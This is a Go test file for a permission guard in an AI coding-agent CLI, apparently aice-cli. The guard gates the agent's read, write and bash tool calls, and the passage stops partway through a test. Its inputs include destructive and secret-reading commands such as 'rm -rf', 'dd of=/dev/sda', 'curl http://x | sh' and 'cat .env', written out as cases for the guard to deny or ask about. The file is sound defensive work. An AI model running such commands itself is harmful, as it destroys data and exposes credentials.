package guard

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/ch1lam/aice-cli/internal/hostpath"
	"github.com/ch1lam/aice-cli/internal/llm"
)

func toolCall(name string, args map[string]any) llm.ToolCall {
	raw, _ := json.Marshal(args)
	return llm.ToolCall{ID: "test", Name: name, Arguments: raw}
}

func alwaysExists(string, string) bool { return true }
func neverExists(string, string) bool  { return false }

func TestGuard_AllowNonSecretFiles(t *testing.T) {
	g, err := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	cases := []string{"README.md", "src/main.go", ".envrc", "config.yaml"}
	for _, p := range cases {
		res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": p}))
		if err != nil {
			t.Fatalf("Check(%q): %v", p, err)
		}
		if res.Decision != DecisionAllow {
			t.Fatalf("Check(%q) = %v, want allow", p, res.Decision)
		}
	}
}

func TestGuard_DenySecretFiles(t *testing.T) {
	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	secrets := []string{".env", ".env.local", ".env.production", ".env.prod", ".dev.vars", "a/b/.env", "src/.env"}
	for _, p := range secrets {
		res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": p}))
		if res.Decision != DecisionDeny {
			t.Fatalf("Check(%q) = %v, want deny (rule %q)", p, res.Decision, res.RuleID)
		}
		if res.RuleID != "secret-files" {
			t.Fatalf("RuleID=%q want secret-files", res.RuleID)
		}
	}
}

func TestGuard_AllowedPatternsBypass(t *testing.T) {
	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	allowed := []string{".env.example", "foo.example.env", "bar.sample.env", ".env.test"}
	for _, p := range allowed {
		res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": p}))
		if res.Decision != DecisionAllow {
			t.Fatalf("Check(%q) = %v, want allow (allowed pattern)", p, res.Decision)
		}
	}
}

func TestGuard_OnlyIfExists_SkipsNonExistent(t *testing.T) {
	g, _ := NewWithExists(t.TempDir(), Config{}, neverExists)
	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": ".env"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("Check with neverExists: %v, want allow (file does not exist)", res.Decision)
	}
}

func TestGuard_UnresolvedConservativelyDenies(t *testing.T) {
	g, _ := NewWithExists(t.TempDir(), Config{}, neverExists)
	// $VAR expansion: cannot prove absence, so deny
	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": "$HOME/.env"}))
	if res.Decision != DecisionDeny {
		t.Fatalf("Check unresolved: %v, want deny", res.Decision)
	}
}

func TestGuard_ReadOnlyDoesNotBlockRead(t *testing.T) {
	cfg := Config{Policies: []PolicyRule{
		{ID: "ro", Patterns: []PatternConfig{{Pattern: "LOCKED.md"}}, Protection: ProtectionReadOnly},
	}}
	// ApplyBuiltins false so only our rule applies
	f := false
	cfg.ApplyBuiltinDefaults = &f
	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": "LOCKED.md"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("readOnly should allow read: %v", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("write", map[string]any{"path": "LOCKED.md"}))
	if res.Decision != DecisionDeny {
		t.Fatalf("readOnly should deny write: %v", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("edit", map[string]any{"path": "LOCKED.md"}))
	// edit uses the production "path" argument key
	if res.Decision != DecisionDeny {
		t.Fatalf("readOnly should deny edit: %v", res.Decision)
	}
}

func TestGuard_BashPathExtraction(t *testing.T) {
	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	// bash cat .env should be denied via path token extraction
	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "cat .env"}))
	if res.Decision != DecisionDeny {
		t.Fatalf("bash cat .env: %v want deny", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "cat README.md"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("bash cat README: %v want allow", res.Decision)
	}
}

func TestGuard_SessionAllow(t *testing.T) {
	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	call := toolCall("read", map[string]any{"path": ".env"})
	res, _ := g.Check(context.Background(), call)
	if res.Decision != DecisionDeny {
		t.Fatalf("pre: %v want deny", res.Decision)
	}
	g.AllowSession(".env")
	res, _ = g.Check(context.Background(), call)
	if res.Decision != DecisionAllow {
		t.Fatalf("post allow: %v want allow", res.Decision)
	}
}

func TestNormalizeFilePath(t *testing.T) {
	cases := map[string]string{"./a//b": "a/b", "a\\b": "a/b", "././a": "a"}
	for in, want := range cases {
		if got := normalizeFilePath(in); got != want {
			t.Fatalf("normalize %q = %q want %q", in, got, want)
		}
	}
}

func TestIsBashRootedPath(t *testing.T) {
	tests := []struct {
		name     string
		path     string
		toolName string
		want     bool
	}{
		{name: "bash root", path: "/tmp/file", toolName: "bash", want: true},
		{name: "bash relative", path: "tmp/file", toolName: "bash", want: false},
		{name: "file tool", path: "/tmp/file", toolName: "read", want: false},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := isBashRootedPath(test.path, test.toolName); got != test.want {
				t.Fatalf("isBashRootedPath(%q, %q) = %v, want %v", test.path, test.toolName, got, test.want)
			}
		})
	}
}

func TestMaybePathLike(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want bool
	}{
		{name: "windows drive env", in: `C:\Users\x\secret.env`, want: true},
		{name: "windows drive no dot", in: `C:\Users\x\secret`, want: true},
		{name: "drive relative", in: `C:secret`, want: true},
		{name: "unc share", in: `\\server\share\file`, want: true},
		{name: "backslash components", in: `foo\bar`, want: true},
		{name: "single escape", in: `\d`, want: false},
		{name: "tilde", in: `~/x`, want: true},
		{name: "slash", in: `foo/bar`, want: true},
		{name: "dotfile", in: `.env`, want: true},
		{name: "number", in: `3.14`, want: false},
		{name: "plain", in: `plain`, want: false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := maybePathLike(tt.in); got != tt.want {
				t.Fatalf("maybePathLike(%q) = %v, want %v", tt.in, got, tt.want)
			}
		})
	}
}

func TestCompileFilePattern_BasenameVsFull(t *testing.T) {
	p := compileFilePattern(PatternConfig{Pattern: ".env"})
	if !p.test(".env") || !p.test("a/b/.env") {
		t.Fatal("basename pattern should match any dir")
	}
	p2 := compileFilePattern(PatternConfig{Pattern: "a/.env"})
	if p2.test(".env") {
		t.Fatal("full-path pattern should not match bare .env")
	}
	if !p2.test("a/.env") {
		t.Fatal("full-path pattern should match a/.env")
	}
}

func TestCompileFilePattern_Regex(t *testing.T) {
	p := compileFilePattern(PatternConfig{Pattern: `\.env$`, Regex: true})
	if !p.test(".env") || !p.test("FOO.env") {
		t.Fatal("regex (?i) should be case-insensitive")
	}
	if p.test("README.md") {
		t.Fatal("regex should not match README")
	}
}

// PR2: permission gate — PR4 turns dangerous into Ask
func TestGuard_DangerousCommandBlocked(t *testing.T) {
	g, _ := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	cases := []string{
		"rm -rf /tmp/x",
		"sudo apt update",
		"dd of=/dev/sda if=/dev/zero",
		"chmod -R 777 /tmp",
		"docker run --privileged nginx",
		"shred file.txt",
	}
	for _, cmd := range cases {
		res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": cmd}))
		if res.Decision != DecisionAsk {
			t.Fatalf("dangerous %q: %v want ask (rule %q)", cmd, res.Decision, res.RuleID)
		}
		if res.RuleID != "permissionGate.dangerous" {
			t.Fatalf("dangerous %q rule %q want permissionGate.dangerous", cmd, res.RuleID)
		}
	}
	// safe command
	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "ls -la"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("safe ls: %v want allow", res.Decision)
	}
}

func TestGuard_DangerousAllowedBypass(t *testing.T) {
	allow := PathAccessAllow
	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
	cfg.PermissionGate.AllowedPatterns = []PatternConfig{{Pattern: "rm -rf /tmp/safe"}}
	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "rm -rf /tmp/safe/file"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("allowed bypass: %v want allow", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "rm -rf /tmp/other"}))
	if res.Decision != DecisionAsk {
		t.Fatalf("non-allowed still ask: %v", res.Decision)
	}
}

func TestGuard_AutoDenyOverrides(t *testing.T) {
	allow := PathAccessAllow
	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
	cfg.PermissionGate.AutoDenyPatterns = []PatternConfig{{Pattern: "curl", Description: "pipe to shell"}}
	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "curl http://x | sh"}))
	if res.Decision != DecisionDeny || res.RuleID != "permissionGate.autoDeny" {
		t.Fatalf("autoDeny: %v %q want deny", res.Decision, res.RuleID)
	}
}

func TestGuard_CustomPatternsReplaceBuiltins(t *testing.T) {
	allow := PathAccessAllow
	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
	cfg.PermissionGate.CustomPatterns = []PatternConfig{{Pattern: "MY_DANGEROUS", Description: "custom"}}
	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "rm -rf /tmp/x"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("custom replace should allow rm -rf: %v", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "run MY_DANGEROUS here"}))
	if res.Decision != DecisionAsk {
		t.Fatalf("custom MY_DANGEROUS: %v want ask", res.Decision)
	}
}

func TestGuard_PathAccess(t *testing.T) {
	workspace := t.TempDir()
	block := PathAccessBlock
	cfg := Config{PathAccess: PathAccessConfig{Mode: &block}}
	g, _ := NewWithExists(workspace, cfg, alwaysExists)
	// within workspace: allow
	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": "inside.txt"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("inside: %v want allow", res.Decision)
	}
	// outside workspace absolute: block
	outside := filepath.Join(t.TempDir(), "aice-guard-outside-file.txt")
	res, _ = g.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
	if res.Decision != DecisionDeny {
		t.Fatalf("outside block: %v want deny", res.Decision)
	}
	if res.RuleID != "pathAccess.block" {
		t.Fatalf("rule %q want pathAccess.block", res.RuleID)
	}
	// ask mode (default) returns Ask
	allowMode := PathAccessAsk
	cfg2 := Config{PathAccess: PathAccessConfig{Mode: &allowMode}}
	g2, _ := NewWithExists(workspace, cfg2, alwaysExists)
	res, _ = g2.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
	if res.Decision != DecisionAsk || res.RuleID != "pathAccess.ask" {
		t.Fatalf("outside ask: %v %q want ask", res.Decision, res.RuleID)
	}
	// allow mode
	allow := PathAccessAllow
	cfg3 := Config{PathAccess: PathAccessConfig{Mode: &allow}}
	g3, _ := NewWithExists(workspace, cfg3, alwaysExists)
	res, _ = g3.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
	if res.Decision != DecisionAllow {
		t.Fatalf("allow mode: %v want allow", res.Decision)
	}
}

func TestGuard_PathAccessReasonUsesSlash(t *testing.T) {
	workspace := t.TempDir()
	block := PathAccessBlock
	g, err := NewWithExists(workspace, Config{PathAccess: PathAccessConfig{Mode: &block}}, alwaysExists)
	if err != nil {
		t.Fatalf("NewWithExists: %v", err)
	}
	outside := filepath.Join(t.TempDir(), "nested", "secret.txt")
	res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if res.Decision != DecisionDeny {
		t.Fatalf("outside block: %v want deny", res.Decision)
	}
	if strings.Contains(res.Reason, `\`) {
		t.Fatalf("Reason uses backslash: %q", res.Reason)
	}
	display := resolveForDisplay(filepath.Clean(outside), workspace)
	if !strings.Contains(res.Reason, display) {
		t.Fatalf("Reason %q does not contain display path %q", res.Reason, display)
	}
}

func TestGuard_PathAccess_AllowedPaths(t *testing.T) {
	workspace := t.TempDir()
	block := PathAccessBlock
	outsideDir := t.TempDir()
	cfg := Config{PathAccess: PathAccessConfig{Mode: &block, AllowedPaths: []AllowedPath{{Kind: "directory", Path: outsideDir}}}}
	g, _ := NewWithExists(workspace, cfg, alwaysExists)
	// file inside allowed directory: allow
	p := filepath.Join(outsideDir, "sub", "file.txt")
	res, _ := g.Check(context.Background(), toolCall("read", map[string]any{"path": p}))
	if res.Decision != DecisionAllow {
		t.Fatalf("allowed dir: %v want allow", res.Decision)
	}
	// file as exact allow
	outsideFile := filepath.Join(t.TempDir(), "aice-guard-allowed-exact.txt")
	cfg2 := Config{PathAccess: PathAccessConfig{Mode: &block, AllowedPaths: []AllowedPath{{Kind: "file", Path: outsideFile}}}}
	g2, _ := NewWithExists(workspace, cfg2, alwaysExists)
	res, _ = g2.Check(context.Background(), toolCall("read", map[string]any{"path": outsideFile}))
	if res.Decision != DecisionAllow {
		t.Fatalf("allowed file exact: %v", res.Decision)
	}
	res, _ = g2.Check(context.Background(), toolCall("read", map[string]any{"path": outsideFile + ".other"}))
	if res.Decision != DecisionDeny {
		t.Fatalf("allowed file should not cover sibling: %v", res.Decision)
	}
}

func TestGuard_PathAccess_SessionAllow(t *testing.T) {
	workspace := t.TempDir()
	block := PathAccessBlock
	cfg := Config{PathAccess: PathAccessConfig{Mode: &block}}
	g, _ := NewWithExists(workspace, cfg, alwaysExists)
	outside := filepath.Join(t.TempDir(), "aice-guard-session.txt")
	call := toolCall("read", map[string]any{"path": outside})
	res, _ := g.Check(context.Background(), call)
	if res.Decision != DecisionDeny {
		t.Fatalf("pre: %v", res.Decision)
	}
	g.AllowPathSession(outside, false)
	res, _ = g.Check(context.Background(), call)
	if res.Decision != DecisionAllow {
		t.Fatalf("post session file allow: %v", res.Decision)
	}
	// dir grant
	outsideDir := t.TempDir()
	call2 := toolCall("read", map[string]any{"path": filepath.Join(outsideDir, "a", "b.txt")})
	res, _ = g.Check(context.Background(), call2)
	if res.Decision != DecisionDeny {
		t.Fatalf("pre dir: %v", res.Decision)
	}
	g.AllowPathSession(outsideDir, true)
	res, _ = g.Check(context.Background(), call2)
	if res.Decision != DecisionAllow {
		t.Fatalf("post dir allow: %v", res.Decision)
	}
}

func TestGuard_PathAccess_SessionAllowCaseFold(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("path grants are case-insensitive only on windows")
	}
	workspace := t.TempDir()
	block := PathAccessBlock
	g, err := NewWithExists(workspace, Config{PathAccess: PathAccessConfig{Mode: &block}}, alwaysExists)
	if err != nil {
		t.Fatalf("NewWithExists: %v", err)
	}
	outside := filepath.Join(t.TempDir(), "aice-guard-case.txt")
	g.AllowPathSession(outside, false)
	alt := strings.ToUpper(outside)
	res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": alt}))
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if res.Decision != DecisionAllow {
		t.Fatalf("case-folded grant: %v want allow", res.Decision)
	}
}

func TestExtractActionsWindowsDrivePath(t *testing.T) {
	call := toolCall("bash", map[string]any{"command": `cat 'C:\Users\x\secret.env'`})
	acts := extractActions(call)
	found := false
	for _, act := range acts {
		if act.Path == `C:\Users\x\secret.env` {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("extractActions missing drive path: %#v", acts)
	}

	call = toolCall("bash", map[string]any{"command": `cat 'C:\Users\x\secret'`})
	acts = extractActions(call)
	found = false
	for _, act := range acts {
		if act.Path == `C:\Users\x\secret` {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("extractActions missing drive path without dot: %#v", acts)
	}
}

func TestGuard_PathAccess_SessionAllowFileDoesNotGrantSibling(t *testing.T) {
	workspace := t.TempDir()
	ask := PathAccessAsk
	cfg := Config{PathAccess: PathAccessConfig{Mode: &ask}}
	g, err := NewWithExists(workspace, cfg, alwaysExists)
	if err != nil {
		t.Fatalf("NewWithExists: %v", err)
	}
	outsideDir := t.TempDir()
	granted := filepath.Join(outsideDir, "granted.txt")
	sibling := filepath.Join(outsideDir, "sibling.txt")

	g.AllowPathSession(granted, false)

	res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": granted}))
	if err != nil {
		t.Fatalf("Check(granted): %v", err)
	}
	if res.Decision != DecisionAllow {
		t.Fatalf("granted file: %v want allow", res.Decision)
	}

	res, err = g.Check(context.Background(), toolCall("read", map[string]any{"path": sibling}))
	if err != nil {
		t.Fatalf("Check(sibling): %v", err)
	}
	if res.Decision != DecisionAsk {
		t.Fatalf("sibling file: %v want ask (Allow this file for this run grants the path, not the parent)", res.Decision)
	}
}

func TestGuard_PathAccess_RejectsRootAndHomeSessionGrant(t *testing.T) {
	workspace := t.TempDir()
	ask := PathAccessAsk
	g, err := NewWithExists(workspace, Config{PathAccess: PathAccessConfig{Mode: &ask}}, alwaysExists)
	if err != nil {
		t.Fatalf("NewWithExists: %v", err)
	}

	outside := filepath.Join(t.TempDir(), "outside.txt")
	g.AllowPathSession("/", false)
	g.AllowPathSession("/", true)
	res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
	if err != nil {
		t.Fatalf("Check after root grant: %v", err)
	}
	if res.Decision != DecisionAsk {
		t.Fatalf("root grant: %v want ask", res.Decision)
	}

	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		t.Skip("home directory is unavailable")
	}
	homeFile := filepath.Join(home, "aice-guard-too-broad.txt")
	if hostpath.Within(workspace, homeFile) {
		t.Skip("workspace covers home; cannot observe a too-broad home grant")
	}
	g.AllowPathSession(home, false)
	g.AllowPathSession(home, true)
	res, err = g.Check(context.Background(), toolCall("read", map[string]any{"path": homeFile}))
	if err != nil {
		t.Fatalf("Check after home grant: %v", err)
	}
	if res.Decision != DecisionAsk {
		t.Fatalf("home grant: %v want ask", res.Decision)
	}

	g.AllowPathSession(outside, false)
	res, err = g.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
	if err != nil {
		t.Fatalf("Check after exact grant: %v", err)
	}
	if res.Decision != DecisionAllow {
		t.Fatalf("exact path grant: %v want allow", res.Decision)
	}
}

// PR3: structural dangerous variants (vs substring)
func TestGuard_StructuralDangerousVariants(t *testing.T) {
	allow := PathAccessAllow
	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
	// rm variants that substring "rm -rf" would miss
	variants := []string{
		"rm -R -f /tmp/x",
		"rm --recursive --force /tmp/x",
		"rm -r -f /tmp/x",
		"rm -Rfv /tmp/x",
		"rm -fr /tmp/x",
	}
	for _, cmd := range variants {
		res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": cmd}))
		if res.Decision != DecisionAsk {
			t.Fatalf("structural rm variant %q: %v want ask", cmd, res.Decision)
		}
	}
	// chmod variants: only -R + 777 should ask
	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "chmod -R 777 /tmp"}))
	if res.Decision != DecisionAsk {
		t.Fatalf("chmod -R 777: %v want ask", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "chmod -R 755 /tmp"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("chmod -R 755: %v want allow", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "chmod 777 /tmp/file"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("chmod 777 without -R: %v want allow", res.Decision)
	}
	// docker privileged only for run/create
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "docker run --privileged nginx"}))
	if res.Decision != DecisionAsk {
		t.Fatalf("docker privileged run: %v", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "docker build --privileged ."}))
	if res.Decision != DecisionAllow {
		t.Fatalf("docker build privileged should allow: %v", res.Decision)
	}
}

func TestGuard_StructuralNoFalsePositive(t *testing.T) {
	allow := PathAccessAllow
	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
	g, _ := NewWithExists(t.TempDir(), cfg, alwaysExists)
	// echo rm -rf should not be flagged (structural: first word is echo)
	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "echo rm -rf /tmp/x"}))
	if res.Decision != DecisionAllow {
		t.Fatalf("echo rm -rf false positive: %v", res.Decision)
	}
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "echo \"rm -rf\""}))
	if res.Decision != DecisionAllow {
		t.Fatalf("echo quoted false positive: %v", res.Decision)
	}
}

func TestGuard_UnknownToolAsks(t *testing.T) {
	g, err := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	cases := []string{"web_search", "Read", "read_file", "custom"}
	for _, name := range cases {
		res, err := g.Check(context.Background(), toolCall(name, map[string]any{"path": "README.md"}))
		if err != nil {
			t.Fatalf("Check(%q): %v", name, err)
		}
		if res.Decision != DecisionAsk {
			t.Fatalf("Check(%q) = %v, want ask", name, res.Decision)
		}
		if res.RuleID != "unknownTool" {
			t.Fatalf("Check(%q) rule %q, want unknownTool", name, res.RuleID)
		}
		if !strings.Contains(res.Reason, "not recognized") {
			t.Fatalf("Check(%q) reason %q, want not recognized", name, res.Reason)
		}
		if res.Action.ToolName != name {
			t.Fatalf("Check(%q) action tool %q", name, res.Action.ToolName)
		}
	}
}

func TestGuard_KnownToolWithoutRestrictedActionAllows(t *testing.T) {
	g, err := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	cases := []llm.ToolCall{
		toolCall("read", map[string]any{}),
		toolCall("write", map[string]any{"content": "x"}),
		toolCall("bash", map[string]any{}),
		toolCall("bash", map[string]any{"command": ""}),
		toolCall("bash", map[string]any{"command": "echo hello"}),
		toolCall("skill", map[string]any{}),
		toolCall("skill", map[string]any{"name": "pdf"}),
		toolCall("skill", map[string]any{"name": "/etc/passwd"}),
	}
	for _, call := range cases {
		res, err := g.Check(context.Background(), call)
		if err != nil {
			t.Fatalf("Check(%q): %v", call.Name, err)
		}
		if res.Decision != DecisionAllow {
			t.Fatalf("Check(%q) = %v, want allow", call.Name, res.Decision)
		}
		if res.RuleID == "unknownTool" {
			t.Fatalf("Check(%q) treated as unknownTool", call.Name)
		}
	}
}

func TestGuard_SkillToolNotBlockedByFilePolicies(t *testing.T) {
	apply := false
	cfg := Config{
		ApplyBuiltinDefaults: &apply,
		Policies: []PolicyRule{
			{ID: "ro", Patterns: []PatternConfig{{Pattern: "*"}}, Protection: ProtectionReadOnly},
			{ID: "na", Patterns: []PatternConfig{{Pattern: "*"}}, Protection: ProtectionNoAccess},
		},
	}
	g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	if isBlocked(ProtectionReadOnly, "skill") {
		t.Fatal("readOnly must not block skill")
	}
	if isBlocked(ProtectionNoAccess, "skill") {
		t.Fatal("noAccess must not block skill")
	}

	res, err := g.Check(context.Background(), toolCall("skill", map[string]any{"name": "pdf"}))
	if err != nil {
		t.Fatalf("Check skill: %v", err)
	}
	if res.Decision != DecisionAllow {
		t.Fatalf("skill under file policies: %v want allow", res.Decision)
	}

	res, err = g.Check(context.Background(), toolCall("write", map[string]any{"path": "LOCKED.md"}))
	if err != nil {
		t.Fatalf("Check write: %v", err)
	}
	if res.Decision != DecisionDeny {
		t.Fatalf("write under readOnly/noAccess: %v want deny", res.Decision)
	}
}

func TestGuard_ReadOnlyRoots(t *testing.T) {
	workspace := t.TempDir()
	skillDir := t.TempDir()
	inside := filepath.Join(skillDir, "references", "guide.md")
	outside := filepath.Join(t.TempDir(), "other.txt")
	cfg := Config{ReadOnlyRoots: []string{skillDir}}
	g, err := NewWithExists(workspace, cfg, alwaysExists)
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	readTools := []string{"read", "grep", "find", "ls"}
	for _, name := range readTools {
		res, err := g.Check(context.Background(), toolCall(name, map[string]any{"path": inside}))
		if err != nil {
			t.Fatalf("Check %s inside: %v", name, err)
		}
		if res.Decision != DecisionAllow {
			t.Fatalf("Check %s inside root: %v want allow", name, res.Decision)
		}
		res, err = g.Check(context.Background(), toolCall(name, map[string]any{"path": outside}))
		if err != nil {
			t.Fatalf("Check %s outside: %v", name, err)
		}
		if res.Decision != DecisionAsk || res.RuleID != "pathAccess.ask" {
			t.Fatalf("Check %s outside root: %v %q want ask", name, res.Decision, res.RuleID)
		}
	}

	for _, name := range []string{"write", "edit"} {
		res, err := g.Check(context.Background(), toolCall(name, map[string]any{"path": inside}))
		if err != nil {
			t.Fatalf("Check %s inside: %v", name, err)
		}
		if res.Decision != DecisionAsk || res.RuleID != "pathAccess.ask" {
			t.Fatalf("Check %s inside root: %v %q want ask", name, res.Decision, res.RuleID)
		}
	}

	res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": "inside.txt"}))
	if err != nil {
		t.Fatalf("Check workspace read: %v", err)
	}
	if res.Decision != DecisionAllow {
		t.Fatalf("workspace read: %v want allow", res.Decision)
	}

	secret := filepath.Join(skillDir, ".env")
	res, err = g.Check(context.Background(), toolCall("read", map[string]any{"path": secret}))
	if err != nil {
		t.Fatalf("Check secret in root: %v", err)
	}
	if res.Decision != DecisionDeny || res.RuleID != "secret-files" {
		t.Fatalf("secret in read-only root: %v %q want deny secret-files", res.Decision, res.RuleID)
	}

	g.AllowPathSession(inside, false)
	res, err = g.Check(context.Background(), toolCall("write", map[string]any{"path": inside}))
	if err != nil {
		t.Fatalf("Check write after grant: %v", err)
	}
	if res.Decision != DecisionAllow {
		t.Fatalf("write after path grant: %v want allow", res.Decision)
	}
}

func TestGuard_ReadOnlyRootsBlockMode(t *testing.T) {
	workspace := t.TempDir()
	skillDir := t.TempDir()
	inside := filepath.Join(skillDir, "scripts", "run.sh")
	outside := filepath.Join(t.TempDir(), "other.txt")
	block := PathAccessBlock
	g, err := NewWithExists(workspace, Config{
		ReadOnlyRoots: []string{skillDir},
		PathAccess:    PathAccessConfig{Mode: &block},
	}, alwaysExists)
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	res, err := g.Check(context.Background(), toolCall("read", map[string]any{"path": inside}))
	if err != nil {
		t.Fatalf("Check read: %v", err)
	}
	if res.Decision != DecisionAllow {
		t.Fatalf("read inside root in block mode: %v want allow", res.Decision)
	}
	res, err = g.Check(context.Background(), toolCall("write", map[string]any{"path": inside}))
	if err != nil {
		t.Fatalf("Check write: %v", err)
	}
	if res.Decision != DecisionDeny || res.RuleID != "pathAccess.block" {
		t.Fatalf("write inside root in block mode: %v %q want deny", res.Decision, res.RuleID)
	}
	res, err = g.Check(context.Background(), toolCall("read", map[string]any{"path": outside}))
	if err != nil {
		t.Fatalf("Check outside: %v", err)
	}
	if res.Decision != DecisionDeny || res.RuleID != "pathAccess.block" {
		t.Fatalf("read outside root in block mode: %v %q want deny", res.Decision, res.RuleID)
	}
}

func TestGuard_PathExtractionAST(t *testing.T) {
	workspace := t.TempDir()
	block := PathAccessBlock
	cfg := Config{PathAccess: PathAccessConfig{Mode: &block}}
	g, _ := NewWithExists(workspace, cfg, alwaysExists)
	// AST should extract redirect target as forced path
	outside := filepath.Join(t.TempDir(), "aice-ast-redirect.txt")
	res, _ := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "echo hi > " + filepath.ToSlash(outside)}))
	if res.Decision != DecisionDeny {
		t.Fatalf("redirect outside: %v want deny", res.Decision)
	}
	// Expansion-aware: $HOME/.env should be unresolved and conservatively denied (if file policy)
	// but path-access: $HOME expands to home, which is outside workspace, so also deny
	res, _ = g.Check(context.Background(), toolCall("bash", map[string]any{"command": "cat $HOME/.env"}))
	// Should be denied either by file policy or path access; allow either
	if res.Decision != DecisionDeny {
		t.Fatalf("$HOME expansion: %v want deny", res.Decision)
	}
	// Pipeline: cat inside, sudo rm outside – sudo should be ask
	allow2 := PathAccessAllow
	cfg2 := Config{PathAccess: PathAccessConfig{Mode: &allow2}}
	g2, _ := NewWithExists(t.TempDir(), cfg2, alwaysExists)
	res, _ = g2.Check(context.Background(), toolCall("bash", map[string]any{"command": "cat README.md | sudo rm -rf /tmp/x"}))
	if res.Decision != DecisionAsk {
		t.Fatalf("pipeline sudo rm: %v want ask", res.Decision)
	}
}

func TestGuard_AllowToolSession(t *testing.T) {
	g, err := NewWithExists(t.TempDir(), Config{}, alwaysExists)
	if err != nil {
		t.Fatalf("New: %v", err)
	}

	res, err := g.Check(context.Background(), toolCall("web_search", map[string]any{"q": "x"}))
	if err != nil {
		t.Fatalf("Check before grant: %v", err)
	}
	if res.Decision != DecisionAsk {
		t.Fatalf("unknown tool before grant: %v want ask", res.Decision)
	}
	if res.RuleID != "unknownTool" {
		t.Fatalf("rule %q want unknownTool", res.RuleID)
	}

	g.AllowToolSession("web_search")

	res, err = g.Check(context.Background(), toolCall("web_search", map[string]any{"q": "x"}))
	if err != nil {
		t.Fatalf("Check after grant: %v", err)
	}
	if res.Decision != DecisionAllow {
		t.Fatalf("granted unknown tool: %v want allow", res.Decision)
	}

	res, err = g.Check(context.Background(), toolCall("custom", map[string]any{"q": "x"}))
	if err != nil {
		t.Fatalf("Check other unknown: %v", err)
	}
	if res.Decision != DecisionAsk {
		t.Fatalf("ungranted unknown tool: %v want ask", res.Decision)
	}
	if res.RuleID != "unknownTool" {
